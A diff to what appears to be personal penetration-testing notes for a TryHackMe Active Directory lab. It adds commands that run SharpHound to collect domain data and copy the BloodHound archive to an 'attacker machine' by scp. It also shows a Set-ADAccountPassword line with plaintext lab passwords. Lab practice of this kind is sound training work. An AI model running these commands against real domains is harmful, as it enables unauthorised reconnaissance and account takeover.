@@ -535,5 +535,14 @@ nxc ldap <IP> -u <user> -p '<pass>' -d <domain> \
 ###################################################################
 FOR password reset old user
 #########################################################################
-PS C:\Users\henry.murphy> Set-ADAccountPassword -Identity edward.hanson -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "Elvira2004" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "Shubham@123" -Force)                                                               
+PS C:\Users\henry.murphy> Set-ADAccountPassword -Identity edward.hanson -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "Elvira2004" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "Shubham@123" -Force)
+
+######################### sharphound ##################################################3
+copy C:\Tools\Sharphound.exe ~\Documents\
+.\SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs
+
+# ================= In attacker Machine =======================================#
+scp henry.murphy@THMJMP1.za.tryhackme.com:C:/Users/henry.murphy/Documents/20261007112621_BloodHound.zip .
+
+                                                               
 ```
